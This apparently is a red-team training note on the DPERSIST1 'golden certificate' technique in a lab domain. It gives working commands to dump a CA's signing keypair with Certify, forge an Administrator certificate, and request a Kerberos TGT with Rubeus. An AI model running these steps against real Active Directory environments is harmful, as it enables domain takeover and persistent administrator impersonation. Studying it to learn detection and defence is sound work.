DPERSIST1 is a persistence technique used to extend privileged access to a CA server into unrestricted privileged access across the entire domain.  If a CA server can be compromised, then an attacker can extract the public and private keys used to sign and issue certificates.  These can be used to forge certificates offline and sign them with a valid key.  You can think of this as the equivalent to the Kerberos krbtgt key, which is why they're often called 'golden certificates'.

if you can compromise a CA through other means, then this can also be used for privilege escalation.

With a Beacon running on a CA, use Certify to dump the keypair in PFX format.
```
run hostname
```

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
```

It's useful to decode the certificate and save it to your attacker desktop for future use.
```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\contoso-root-ca.pfx",[Convert]::FromBase64String("MIACAQ[...snip...]AAAAA="))
```

Then you can use it to forge certificates whenever you desire.  Here's an example of forging a certificate for the default domain administrator.
```
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\contoso-root-ca.pfx --quiet --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
```

Then use it with Rubeus to get a tgs
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:MIACAPQBjAG8AbQAsAEAAAA= /enctype:aes256 /nowrap
```
